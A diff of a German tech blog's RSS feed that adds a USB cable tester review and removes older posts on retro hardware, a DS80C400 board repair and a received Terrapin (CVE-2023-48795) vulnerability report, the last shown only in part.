+<p>Mein Werkzeug soll eins sein – funktionieren. Ich will mich nicht darüber ärgern, es soll mich nicht umbringen und bitte auch nicht die Welt kosten. Ja, vieles davon stammt tatsächlich von AliExpress <img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f600.png" alt="😀" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<h2 class="wp-block-heading">USB-Kabeltester – mein Einstieg</h2>
+
+
+
+<p>Heute stelle ich dir einen USB-Kabeltester vor. Mittlerweile kommt fast jedes Gerät mit einem USB-Kabel – zum Laden oder für den Datenaustausch. Besonders mit USB-C hat sich die Vielfalt der Kabelstandards enorm vergrößert. Ich meine damit nicht nur Lade-Standards, Spannungen und Leistungen, sondern auch verschiedene Datenübertragungsmodi.</p>
+
+
+
+<p>Früher, zu Zeiten von USB-A/B, war das noch eindeutig: Ein Kabel konnte so ziemlich alles – Laden oder Daten. Mit Micro-USB begann dann der Wandel: Viele Kabel taugen nur noch zum Laden und übertragen keine Daten mehr.</p>
+
+
+
+<p>So oder so hast du sicher auch so eine Schublade zuhause, in der sich unzählige USB-Kabel sammeln. Ständig ziehst du eins heraus und fragst dich: <em>„Kannst du Daten übertragen?“</em> Das Kabel schweigt. Und bei seltsamem Verhalten fragt man sich: <em>„Hast du einen Kabelbruch?“</em> – auch hier bleibt das Kabel stumm.</p>
+
+
+
+<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2025/09/USB-Kabeltester-1-676x507-640x480.jpg" title="USB-Kabeltester-1" alt="USB Kabeltester mit leuchtenden LEDs, eingestecktem USB-C Kabel und offenem Handbuch." /></div></div>
+
+
+
+<h2 class="wp-block-heading">Praktische Hilfe für den Alltag</h2>
+
+
+
+<p>Hier kommt der USB-Kabeltester ins Spiel: Unter 10 €, betrieben mit einer einzigen CR2032-Knopfzelle, und er passt praktisch auf jede USB-Variante – selbst Lightning.</p>
+
+
+
+<p>Link zu AliExpress: <a href="https://s.click.aliexpress.com/e/_oBI7lsv" target="_blank" rel="noreferrer noopener">https://s.click.aliexpress.com/e/_oBI7lsv</a></p>
+
+
+
+<h3 class="wp-block-heading"><strong>So funktioniert’s:</strong></h3>
+
+
+
+<p>Beide Kabelenden einstecken, Gerät einschalten, und die beschrifteten LEDs zeigen sofort, welche Leitungen im Kabel verbunden sind – oder auch nicht. Wer einen Kabelbruch sucht, wackelt einfach am Kabel – wenn eine LED ausgeht, ist der Fehler gefunden. Und nein – das Ergebnis wird nicht durch irgendwelche Kondensatoren verfälscht.</p>
+
+
+
+<p>Im Lieferumfang ist auch ein kleines, verständliches Handbuch enthalten: Es erklärt übersichtlich, welche Pins/Adern wo liegen und welche Funktion sie jeweils haben.</p>
+
+
+
+<h2 class="wp-block-heading">Fazit</h2>
+
+
+
+<p>Mit dem USB-Kabeltester machst du dir den Alltag deutlich leichter – schnelle Kontrolle, einfache Bedienung, preiswert und super praktisch. Perfekt für alle Hobbybastler:innen, die einfach Ergebnisse wollen, ohne viel Aufwand.</p>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.kernel-error.de/2025/09/01/kabelfaehigkeiten-kabelbrueche-finden-der-usb-kabeltester/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
 		<title>S/MIME-Zertifikat per DNS veröffentlichen – SMIMEA</title>
 		<link>https://www.kernel-error.de/2025/03/14/s-mime-zertifikat-erneuern-per-dns-veroeffentlichen-automatisiert-mit-python/</link>
 					<comments>https://www.kernel-error.de/2025/03/14/s-mime-zertifikat-erneuern-per-dns-veroeffentlichen-automatisiert-mit-python/#comments</comments>
@@ -65,7 +1009,7 @@
 
 					<description><![CDATA[Mal wieder soweit: Mein aktuelles S/MIME-Zertifikat zum Signieren von E-Mails läuft aus. Also habe ich mir ein neues besorgt. Da GlobalSign keine Class-2-Zertifikate mehr für Privatpersonen anbietet, musste ich die CA wechseln. Durch Zufall bin ich auf SSLplus gestoßen – die haben echt gute Angebote für alle möglichen Zertifikate. Aber darum soll es in diesem [&#8230;]]]></description>
 										<content:encoded><![CDATA[<div class="wp-block-image">
-<figure class="alignleft size-full is-resized"><img fetchpriority="high" decoding="async" width="1024" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2025/03/smimea.webp" alt="smimea S/MIME Blog Image" class="wp-image-3221" style="width:173px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/03/smimea.webp 1024w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-300x300.webp 300w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-150x150.webp 150w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-768x768.webp 768w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-676x676.webp 676w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>
+<figure class="alignleft size-full is-resized"><img loading="lazy" decoding="async" width="1024" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2025/03/smimea.webp" alt="smimea S/MIME Blog Image" class="wp-image-3221" style="width:173px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/03/smimea.webp 1024w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-300x300.webp 300w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-150x150.webp 150w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-768x768.webp 768w, https://www.kernel-error.de/wp-content/uploads/2025/03/smimea-676x676.webp 676w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></figure></div>
 
 
 <p>Mal wieder soweit: Mein aktuelles S/MIME-Zertifikat zum Signieren von E-Mails läuft aus. Also habe ich mir ein neues besorgt. Da GlobalSign keine Class-2-Zertifikate mehr für Privatpersonen anbietet, musste ich die CA wechseln. Durch Zufall bin ich auf <a href="https://sslplus.de/" target="_blank" rel="noreferrer noopener"><strong>SSLplus</strong></a> gestoßen – die haben echt gute Angebote für alle möglichen Zertifikate. Aber darum soll es in diesem Beitrag nicht gehen.</p>
@@ -91,9 +1035,9 @@
 <pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">./smimea_generate_record.py
 Enter the email address: kernel-error@kernel-error.com
 Enter the path to the PEM certificate: mail.pem
-<img src="https://s.w.org/images/core/emoji/15.1.0/72x72/2705.png" alt="✅" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Email 'kernel-error@kernel-error.com' matches the certificate!
+<img src="https://s.w.org/images/core/emoji/16.0.1/72x72/2705.png" alt="✅" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Email 'kernel-error@kernel-error.com' matches the certificate!
 
-<img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f539.png" alt="🔹" class="wp-smiley" style="height: 1em; max-height: 1em;" /> **Generated BIND9 DNS Record:**
+<img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f539.png" alt="🔹" class="wp-smiley" style="height: 1em; max-height: 1em;" /> **Generated BIND9 DNS Record:**
 
 70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com. 3600 IN SMIMEA 3 0 0 (
    30820714308204FCA003020102021073C13C478DA7B114B871F00737F1B0FB30
@@ -379,7 +1323,7 @@ Certificate:
 
 
 
-<p>Pffff… Eigentlich wollte ich doch nur schnell schreiben, dass ich da zwei Python-Skripte zusammengebastelt habe – und am Ende ist es doch wieder so ein riesiges Ding geworden. <img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f605.png" alt="😅" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>Pffff… Eigentlich wollte ich doch nur schnell schreiben, dass ich da zwei Python-Skripte zusammengebastelt habe – und am Ende ist es doch wieder so ein riesiges Ding geworden. <img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f605.png" alt="😅" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 
 
 
@@ -391,7 +1335,7 @@ Certificate:
 
 
 
-<p>Viel Spaß! <img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f603.png" alt="😃" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>Viel Spaß! <img src="https://s.w.org/images/core/emoji/16.0.1/72x72/1f603.png" alt="😃" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 
 
 
@@ -412,1226 +1356,6 @@ Certificate:
 					
 					<wfw:commentRss>https://www.kernel-error.de/2025/03/14/s-mime-zertifikat-erneuern-per-dns-veroeffentlichen-automatisiert-mit-python/feed/</wfw:commentRss>
 			<slash:comments>1</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>PDS OSIcom-Office Box: Retro-PC mit JUMPtec SBC &#038; SUSE Linux​</title>
-		<link>https://www.kernel-error.de/2025/02/28/pds-osicom-office-box-retro-pc-mit-jumptec-suse-linux/</link>
-					<comments>https://www.kernel-error.de/2025/02/28/pds-osicom-office-box-retro-pc-mit-jumptec-suse-linux/#respond</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Fri, 28 Feb 2025 14:33:04 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[Linux]]></category>
-		<category><![CDATA[OSIcom]]></category>
-		<category><![CDATA[OSIcom-office Box]]></category>
-		<category><![CDATA[PDS]]></category>
-		<category><![CDATA[Programm und Datenservice]]></category>
-		<category><![CDATA[retro]]></category>
-		<category><![CDATA[Rotenburg]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=3180</guid>
-
-					<description><![CDATA[Vor etwas über 20 Jahren habe ich unter anderem mit OSIcom-office Boxen von PDS (Programm und Datenservice) gearbeitet. Dazu habe ich schon mal etwas geschrieben. Zufällig bin ich dann in einem Onlineshop auf genau so eine OSIcom Box gestoßen, die dort zum Verkauf angeboten wurde. Der Preis lag deutlich über dem, was ich aus nostalgischen [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<p>Vor etwas über 20 Jahren habe ich unter anderem mit OSIcom-office Boxen von <a href="https://pds.de/" target="_blank" rel="noreferrer noopener">PDS (Programm und Datenservice) </a>gearbeitet. <a href="https://www.kernel-error.de/2013/11/10/pds-programm-datenservice-gmbh/" data-type="link" data-id="https://www.kernel-error.de/2013/11/10/pds-programm-datenservice-gmbh/" target="_blank" rel="noreferrer noopener">Dazu habe ich schon mal etwas geschrieben.</a></p>
-
-
-<div class="wp-block-image">
-<figure class="alignleft size-large is-resized"><img decoding="async" width="1024" height="768" src="https://www.kernel-error.de/wp-content/uploads/2025/02/PDS-OSIcom-office-Box-05-1024x768.jpg" alt="Picture of an PDS OSIcom-office Box" class="wp-image-3184" style="width:134px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/02/PDS-OSIcom-office-Box-05-1024x768.jpg 1024w, https://www.kernel-error.de/wp-content/uploads/2025/02/PDS-OSIcom-office-Box-05-300x225.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2025/02/PDS-OSIcom-office-Box-05-768x576.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/02/PDS-OSIcom-office-Box-05-1536x1152.jpg 1536w, https://www.kernel-error.de/wp-content/uploads/2025/02/PDS-OSIcom-office-Box-05-2048x1536.jpg 2048w, https://www.kernel-error.de/wp-content/uploads/2025/02/PDS-OSIcom-office-Box-05-676x507.jpg 676w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>
-
-
-<p>Zufällig bin ich dann in einem Onlineshop auf genau so eine OSIcom Box gestoßen, die dort zum Verkauf angeboten wurde. Der Preis lag deutlich über dem, was ich aus nostalgischen Gründen bereit wäre, dafür zu zahlen – aber ich habe einfach mal mein Glück versucht und per E-Mail ein Angebot unterbreitet. Und siehe da, der Verkäufer war einverstanden! Nun bin ich also Besitzer einer alten OSIcom-office Box. An dieser Stelle noch einmal vielen Dank an <a href="https://wie-tec.de" target="_blank" rel="noreferrer noopener">Wie-Tec</a> für das Entgegenkommen.</p>
-
-
-
-<p>Die Box basiert auf einem SBC (Single Board Computer) von JUMPtec. Das Modell scheint folgendes zu sein: <strong>07029-0000-26-7</strong>. Im POST wird die BIOS-Version <code>&lt;LEU2R118&gt;</code> angezeigt. Hersteller: <strong>JUMPtec® Industrielle Computertechnik AG</strong>.</p>
-
-
-
-<p>Verbaut sind ein <strong>Intel Pentium MMX 266 MHz</strong>, <strong>256 MB RAM</strong>, eine <strong>40 GB Festplatte</strong>, ein <strong>Diskettenlaufwerk</strong>, sowie eine <strong>Netzwerk- und ISDN-Karte</strong>. Der SBC steckt in einer ISA-Backplane. Das könnte sogar ein ziemlich guter <strong>Retro-DOS-Gaming-PC</strong> werden!</p>
-
-
-
-<p>Spannenderweise war die Festplatte noch mit Daten gefüllt. Ob es sich dabei nur um eine Testinstallation oder echte Produktivdaten handelt, kann ich nicht bewerten. Überrascht hat mich das dennoch positiv, denn so konnte ich den kompletten Bootvorgang noch einmal genießen. Wobei – nicht nur ich:</p>
-
-
-
-<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
-<iframe title="PDS Osicom-Office Box – Boot, Restart &amp; BIOS Navigation Demo" width="676" height="380" src="https://www.youtube.com/embed/_yK9_Z926oo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div></figure>
-
-
-
-<p><strong>Kernel 2.4.27 – man, ist das lange her!</strong> Grundlage ist ein altes <strong>SUSE Linux</strong>. Natürlich habe ich auch noch ein paar Bilder für euch angelegt.</p>
-
-
-
-<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2025/02/PDS-OSIcom-office-Box-06-676x507-640x480.jpg" title="PDS-OSIcom-office-Box-06" alt="Picture of an PDS OSIcom-office Box backview" /></div></div>
-
-
-
-<p>Das BIOS konnte ich sichern, und zusammen mit den Bildern wird das sicher eine brauchbare Ergänzung für <strong>&#8222;The Retro Web&#8220;</strong>. Falls jemand von euch noch Handbücher oder ähnliches zur Hardware hat – ich würde mich sehr darüber freuen!</p>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2025/02/28/pds-osicom-office-box-retro-pc-mit-jumptec-suse-linux/feed/</wfw:commentRss>
-			<slash:comments>0</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>Dallas DS80C400: 8051-Ethernet-Mikrocontroller neu entdeckt​</title>
-		<link>https://www.kernel-error.de/2025/02/18/dallas-ds80c400-ethernet-mikrocontroller-neu-entdeckt/</link>
-					<comments>https://www.kernel-error.de/2025/02/18/dallas-ds80c400-ethernet-mikrocontroller-neu-entdeckt/#respond</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Tue, 18 Feb 2025 17:58:46 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[DS80C400]]></category>
-		<category><![CDATA[DSTINIM400]]></category>
-		<category><![CDATA[Elektronik]]></category>
-		<category><![CDATA[MAXIM]]></category>
-		<category><![CDATA[TINI]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=3144</guid>
-
-					<description><![CDATA[Vor ziemlich genau 20 Jahren habe ich in einem Unternehmen gearbeitet, in dem Teile einer eigens entwickelten Lösung eine Zeit lang auf einem DALLAS DS80C400 basierten. Der DALLAS DS80C400 ist ein hochintegrierter, netzwerkfähiger Mikrocontroller, der auf der Architektur des klassischen 8051 basiert. Entwickelt wurde er von Dallas Semiconductor (später Maxim Integrated) und war besonders für [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<p>Vor ziemlich genau 20 Jahren habe ich in einem Unternehmen gearbeitet, in dem Teile einer eigens entwickelten Lösung eine Zeit lang auf einem DALLAS DS80C400 basierten.</p>
-
-
-<div class="wp-block-image">
-<figure class="alignleft size-large is-resized"><img loading="lazy" decoding="async" width="799" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2025/02/TINI400-799x1024.jpg" alt="" class="wp-image-3171" style="width:117px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/02/TINI400-799x1024.jpg 799w, https://www.kernel-error.de/wp-content/uploads/2025/02/TINI400-234x300.jpg 234w, https://www.kernel-error.de/wp-content/uploads/2025/02/TINI400-768x985.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/02/TINI400-676x867.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2025/02/TINI400.jpg 915w" sizes="auto, (max-width: 799px) 100vw, 799px" /></figure></div>
-
-
-<p>Der DALLAS DS80C400 ist ein hochintegrierter, netzwerkfähiger Mikrocontroller, der auf der Architektur des klassischen 8051 basiert. Entwickelt wurde er von Dallas Semiconductor (später Maxim Integrated) und war besonders für eingebettete Systeme geeignet, die eine Ethernet-Konnektivität benötigten.</p>
-
-
-
-<p>Ja, klingt nicht weiter spannend, ich weiß – aber wir schreiben ja auch das Jahr 2025 und nicht 2005. Viele werden sich erinnern, dass der Raspberry Pi (Model B) im Februar 2012 veröffentlicht wurde. Arduino gab es zwar bereits seit 2005, aber ein einfach nutzbares TCP/IP-Netzwerk? Das war damals noch nicht so selbstverständlich. Der DS80C400 war mit seinem integrierten Netzwerkstack also ein ziemlich guter Mikrocontroller seiner Zeit.</p>
-
-
-
-<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2025/02/DSTINIM400-DS80C400-front-676x507-640x480.jpg" title="DSTINIM400-DS80C400-front" alt="Pucture of DSTINIM400 Embedded Module front with DS80C400 Mikrocontroller." /></div></div>
-
-
-
-<p>Ich hatte ihn damals fertig montiert auf den Entwicklerboards von MAXIM in den Fingern. Das <strong>DSTINIM400</strong> Embedded-Modul hatte 1 MB Flash, 1 MB SRAM, konnte 10/100 Mbit/s Ethernet, hatte zwei serielle RS232-Schnittstellen und noch ein paar andere nette Features. Dieses Modul steckte dann auf einem <strong>DSTINIS400</strong>, das – na ja, nennen wir es Hostboard – also eine Platine, die das DSTINIM400 aufnimmt und die verschiedenen Schnittstellen bereitstellt (Maxim TINI s400 Evaluation Board Socket).</p>
-
-
-
-<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2025/02/DSTINIM400-TINI-s400-Sockets-Board-front-676x507-640x480.jpg" title="DSTINIM400-TINI-s400-Sockets-Board-front" alt="Picture of DSTINIS400 Sockets Board with attached DSTINIM400 front." /></div></div>
-
-
-
-<p>Genau so ein Teil habe ich nun beim Aufräumen meiner „da muss ich noch mal nachschauen“-Elektronikkiste gefunden. Wirklich etwas damit tun wollte ich nicht, aber aus nostalgischen Gründen wollte ich es zumindest einmal booten sehen. Meine Erinnerung daran, wie das alles genau funktionierte, ist allerdings ziemlich verblasst. Irgendwas war da mit einer der beiden RS232-Schnittstellen und einem Terminalprogramm … also los.</p>
-
-
-
-<p>Die mit <strong>Loader &#8211; Serial 0</strong> beschriftete RS232-Schnittstelle war es, meine ich. Also habe ich mein Breakout-Board angeschlossen und ein bisschen herumgemessen. Sah soweit richtig aus – zumindest zeigte mein Oszilloskop beim Booten Aktivität auf den Datenleitungen. Die Pin-Belegung ist 1:1.</p>
-
-
-
-<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th><strong>DSTINIm400 (DB9, DCE)</strong></th><th><strong>PC (DB9, DTE)</strong></th><th><strong>Funktion</strong></th></tr></thead><tbody><tr><td><strong>2 (TXD)</strong></td><td><strong>2 (RXD)</strong></td><td>Senden → Empfangen</td></tr><tr><td><strong>3 (RXD)</strong></td><td><strong>3 (TXD)</strong></td><td>Empfangen ← Senden</td></tr><tr><td><strong>5 (GND)</strong></td><td><strong>5 (GND)</strong></td><td>Gemeinsame Masse</td></tr></tbody></table></figure>
-
-
-
-<p>Die Konfiguration der RS232 ist 9600 Baud, also 9,6 kbps. Dann noch <strong>8N1</strong>:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>8 Datenbits</strong> (8 Bits pro Zeichen)</li>
-
-
-
-<li><strong>N Paritätsbit</strong> (keine Parität)</li>
-
-
-
-<li><strong>1 Stoppbit</strong></li>
-</ul>
-
-
-
-<p>Da wirklich nur diese drei Leitungen benötigt werden, habe ich den Rest direkt beim Aufruf meiner Terminalemulation deaktiviert:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">screen /dev/ttyUSB1 9600,cs8,-dtr,-rts</pre>
-
-
-
-<p>Hm … es passiert etwas, aber leider kommt nur Zeichensalat. Das spricht eher dafür, dass ich eine falsche Baudrate eingestellt habe. Also habe ich unterschiedliche Geschwindigkeiten ausprobiert – leider mit mehr oder weniger dem gleichen Ergebnis.</p>
-
-
-
-<p>Vielleicht ist das auch der Grund, warum das Teil überhaupt in dieser Kiste gelandet ist?!</p>
-
-
-
-<p>Ich wollte schon aufgeben, da fiel mir auf der Rückseite etwas auf: Ein <strong>MAX560CAI</strong>, ein Low-Dropout-Voltage-Regulator. In seiner direkten Nachbarschaft fehlen zwei Kondensatoren – <strong>C33 </strong>und<strong> C34</strong>. Klingt so, als wenn dort ein Keramik- oder Tantal-Kondensator für 10V und irgendwas zwischen <strong>1 µF bis 10 µF</strong> hingehört. Und das könnte durchaus problematisch sein, denn einige Leitungen führen direkt bis zur RS232-Schnittstelle.</p>
-
-
-
-<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2025/02/MAXIM-MAX560CAI-676x380-640x480.png" title="MAXIM MAX560CAI" alt="Picture of an MAXIM MAX560CAI IC" /></div></div>
-
-
-
-<p>Um die richtigen Werte für die Kondensatoren zu finden, musste ich dann doch ein bisschen im Internet suchen. Dabei bin ich zumindest schon mal auf ein paar PDFs gestoßen, die ich hier mit euch teilen möchte.</p>
-
-
-
-<p><a href="https://www.kernel-error.de/download/DSTINIm400EVKit.pdf" target="_blank" rel="noreferrer noopener">DSTINIS-005-DSTINIS400.pdf</a><br><a href="https://www.kernel-error.de/download/TINI_GUIDE.pdf" target="_blank" rel="noreferrer noopener">TINI_GUIDE.pdf</a><br><a href="https://www.kernel-error.de/download/DSTINIm400.pdf" target="_blank" rel="noreferrer noopener">DSTINIm400.pdf</a><br><a href="https://www.kernel-error.de/download/DSTINIm400EVKit.pdf" target="_blank" rel="noreferrer noopener">DSTINIm400EVKit.pdf</a></p>
-
-
-
-<p>Im <strong>DSTINIS-005-DSTINIS400.pdf</strong> bin ich dann zum Glück fündig geworden:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>C10, C31, C32, C34-C36</strong> → <strong>1 µF</strong></li>
-
-
-
-<li><strong>C33</strong> → <strong>10 nF</strong></li>
-</ul>
-
-
-
-<p>Passende SMD-Bauteile hatte ich zwar nicht (nicht gefunden), aber <strong>THT </strong>sollte für einen Test reichen. Für C33 habe ich einfach ebenfalls einen <strong>1 µF-Kondensator</strong> genommen – das war mir passend genug für einen Versuch.</p>
-
-
-
-<p>Noch ein Test mit <strong>115200 Baud</strong> und … <strong>ha, er bootet!</strong> <img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f603.png" alt="😃" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
-
-
-
-<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
-<iframe loading="lazy" title="MAXIM DSTINIM400 booting TINI slush OS Version1.17" width="676" height="380" src="https://www.youtube.com/embed/nzKrhYTIsbE?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div></figure>
-
-
-
-<p><em>TINI Slush OS v1.17</em> – man, man, man … lange nicht gesehen!</p>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2025/02/18/dallas-ds80c400-ethernet-mikrocontroller-neu-entdeckt/feed/</wfw:commentRss>
-			<slash:comments>0</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>Sicherheitslücken melden: Mein Umgang mit einem Vulnerability Report​</title>
-		<link>https://www.kernel-error.de/2025/02/17/sicherheitsluecken-melden-mein-umgang-mit-einem-vulnerability-report/</link>
-					<comments>https://www.kernel-error.de/2025/02/17/sicherheitsluecken-melden-mein-umgang-mit-einem-vulnerability-report/#comments</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Mon, 17 Feb 2025 09:20:07 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[Security]]></category>
-		<category><![CDATA[SSH]]></category>
-		<category><![CDATA[Vulnerability Report]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=3133</guid>
-
-					<description><![CDATA[Vor Kurzem habe ich einen Vulnerability Report erhalten. Ich freue mich natürlich immer über solche Hinweise – sie helfen mir, zu wachsen und mein Setup zu verbessern, bevor jemand eine Schwachstelle tatsächlich ausnutzt. Der Report lautet wie folgt: Subject: Vulnerability Report: Vulnerable System Detected at openpgpkey.kernel-error.comHello Team,I have identified a security issue in your system [&#8230;]]]></description>
-										<content:encoded><![CDATA[<div class="wp-block-image">
-<figure class="alignleft size-full is-resized"><img loading="lazy" decoding="async" width="1024" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2025/02/Vulnerability-Report.webp" alt="Vulnerability Report" class="wp-image-3139" style="width:201px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/02/Vulnerability-Report.webp 1024w, https://www.kernel-error.de/wp-content/uploads/2025/02/Vulnerability-Report-300x300.webp 300w, https://www.kernel-error.de/wp-content/uploads/2025/02/Vulnerability-Report-150x150.webp 150w, https://www.kernel-error.de/wp-content/uploads/2025/02/Vulnerability-Report-768x768.webp 768w, https://www.kernel-error.de/wp-content/uploads/2025/02/Vulnerability-Report-676x676.webp 676w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></figure></div>
-
-
-<p>Vor Kurzem habe ich einen <a href="https://www.bsi.bund.de/EN/IT-Sicherheitsvorfall/IT-Schwachstellen/it-schwachstellen.html" target="_blank" rel="noreferrer noopener">Vulnerability Report</a> erhalten. Ich freue mich natürlich immer über solche Hinweise – sie helfen mir, zu wachsen und mein Setup zu verbessern, bevor jemand eine Schwachstelle tatsächlich ausnutzt.</p>
-
-
-
-<p>Der Report lautet wie folgt:</p>
-
-
-
-<pre class="wp-block-preformatted">Subject: Vulnerability Report: Vulnerable System Detected at openpgpkey.kernel-error.com<br><br>Hello Team,<br><br>I have identified a security issue in your system related to a vulnerability (CVE-2023-48795) in Terrapin.<br><br>Vulnerability Details:<br>- CVE Identifier: CVE-2023-48795<br>- Vulnerability Type: javascript<br>- Severity: medium<br>- Host: openpgpkey.kernel-error.com<br>- Affected Port: 22<br><br>Description: A security vulnerability (CVE-2023-48795) related to Terrapin has been detected in your system. This vulnerability could be exploited to compromise your system's security. Please see the details below for more information.<br><br>Impact: Impact:<br>1. Potential for Unauthorized Access: Attackers may exploit this vulnerability to gain unauthorized access.<br>2. System Compromise: Vulnerable systems could be compromised, leading to data loss or further attacks.<br>3. Increased Attack Surface: Exposing systems with this vulnerability increases the risk of exploitation.<br><br><br>Recommendation: Recommendation:<br>1. Apply patches for CVE-2023-48795: Ensure your systems are updated to address this vulnerability.<br>2. Conduct a Security Review: Regularly review and update your security policies and procedures.<br>3. Monitor for Suspicious Activity: Implement continuous monitoring to detect any potential exploitation attempts.<br>4. Restrict Access: Limit access to systems vulnerable to exploitation.<br><br><br>Best Regards,<br>Security Team</pre>
-
-
-
-<p>Ich war mir eigentlich sicher, dass ich Terrapin schon vor langer Zeit überall gepatcht und in den SSH-Konfigurationen berücksichtigt hatte.</p>
-
-
-
-<p>Dann kam der Hinweis auf <code>openpgpkey.kernel-error.com</code>. Die Domain existiert als CNAME und gehört zur Web Key Directory (WKD), was im Groben dazu dient, öffentliche GPG-Keys möglichst automatisiert abrufen zu können. Wenn mir also jemand eine Mail schreiben möchte, aber meinen öffentlichen Key nicht hat, kann er diesen einfach über WKD beziehen. Ich habe das Ganze als CNAME zu <code>wkd.keys.openpgp.org</code> angelegt, weil dieser Keyserver zumindest eine E-Mail-Validierung beim Hochladen öffentlicher Schlüssel durchführt. Ich muss ja nicht jede Infrastruktur selbst betreiben.</p>
-
-
-
-<p>Allerdings gehört der betroffene SSH-Server und das gesamte Zielsystem somit gar nicht zu meiner Infrastruktur – ich kann also selbst nichts tun.</p>
-
-
-
-<p><strong>Vulnerability Type: JavaScript</strong></p>
-
-
-
-<p>Das verstehe ich nicht ganz. Vermutlich hat der Finder einfach sein Standard-Template benutzt und nicht angepasst?! Aber zumindest wollte ich prüfen, ob seine Einschätzung zum SSH-Server überhaupt zutrifft:</p>
-
-
-
